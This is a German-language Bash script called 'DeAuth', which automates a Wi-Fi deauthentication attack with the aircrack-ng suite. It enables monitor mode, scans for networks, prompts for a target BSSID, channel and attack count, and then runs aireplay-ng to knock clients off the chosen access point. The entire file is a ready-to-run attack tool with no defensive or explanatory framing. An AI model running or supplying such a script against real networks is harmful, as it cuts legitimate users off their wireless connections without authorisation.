#!/bin/bash
#
VERSION="1.0"
# Version 1.0 - erstes Release
#
# root Prüfung

if [ `echo -n $USER` != "root" ]
then
        echo ""
	echo "* WICHTIG *"
        echo ""
	echo "Bitte als root ausführen"
	echo ""
	exit 1
fi

#
# Prüfung und Infoanzeige

if [ -z ${1} ]
then
        echo ""
	echo " *** DeAuth Version ${VERSION} *** "
        echo ""
	echo "Eingabe: `basename ${0}` [interface] [BSSID] [Kanal] [Anzahl d. Angriffe]"
        echo ""
	echo "Beispiel #`basename ${0}` wlan0 (weitere Angaben sind optional)"
        echo ""
	exit 1
else
	ORGINTERFACE="`echo "${1}" | cut -c 1-10`"
        BSSID=${2}
        CHANNEL=${3}
        ATKTIMER=${4}
        echo ""
	echo "Starte Monitor-Modus an "${ORGINTERFACE}
        echo ""
fi

#
# WLAN IN MONITOR MODE

airmon-ng start ${ORGINTERFACE} > /dev/nul
INTERFACE=${ORGINTERFACE}"mon"
#ATKTIMER="1"
#iwconfig ${INTERFACE} 

# Prüfe, ob BSSID, Kanal und Anzahl der Angriffe eingeben wurde
##
if [ -z ${2} ] || [ -z ${3} ] || [ -z ${4} ]; then
#
        clear
        echo ""
        echo "      (( (o) ))     "
        echo " +-------/|\-------+"
        echo " |      /\|/\      |"
        echo " |     /\_|_/\     |"
        echo " |    /\__|__/\    |"
        echo " +--------|--------+"
        echo ""
	echo "INFO:"
        echo "-----"
        echo "Es wird nun nach verfügbaren WLAN Netzwerke gescannt."
        echo "Wenn das gewünschte Ziel aufgelistet ist, kann die Suche abgebrochen werden."
	echo "Zum Abbrechen bitte 'Ctrl-C' betätigen"
        echo ""
	read -p "Drücke ENTER zum starten"
	airodump-ng ${INTERFACE}

	while true
	do
                echo ""
                echo "--------------------------------------"
		echo -n "BSSID eingeben:      "
		read -e BSSID
		echo -n "Kanal eingeben:      "
		read -e CHANNEL
                echo -n "Anzahl der Angriffe: "
                read -e ATKTIMER
                echo ""

                echo "-----------  ZUSAMMENFASSUNG  -------------"
  		echo "Ziel BSSID              : ${BSSID}"
		echo "Ziel Kanal              : ${CHANNEL}"
                echo "Wie oft angreifen       : ${ATKTIMER}"
                echo "-------------------------------------------"
		echo -n "Sind die Eingaben korrekt? (j/n): "
	  	read -e CONFIRM
	 	case $CONFIRM in
	    		y|Y|YES|yes|Yes|j|J|ja|Ja)
				break ;;
	    		*) echo "Bitte Daten neu eingeben"
	  	esac
	done
fi

# starte DEAUTH
echo ""
echo "-----------------------"
echo "  * INITIALISIERUNG *  "
echo "-----------------------"
echo ""
sleep 1
echo "-----------------------"
echo "PHASE 1, Kanal anpassen"
echo "-----------------------"
echo ""
sleep 1
#airmon-ng check ${INTERFACE} ${CHANNEL}
airmon-ng stop ${INTERFACE}  > /dev/nul
airmon-ng start ${ORGINTERFACE} ${CHANNEL} > /dev/nul
echo "-----------------------"
echo "PHASE 2: Angriff !"
echo "-----------------------"
echo ""
sleep 1
aireplay-ng -a ${BSSID} ${INTERFACE} -0 ${ATKTIMER}
sleep 1
#
airmon-ng stop ${INTERFACE} > /dev/nul
#//
echo ""
echo ""
echo " OFFLINE  X        "
echo " +-------/|\-------+"
echo " |      /\|/\      |"
echo " |     /\_|_/\     |"
echo " |    /\__|__/\    |"
echo " +--------|--------+"
echo ""
echo ""

exit 0

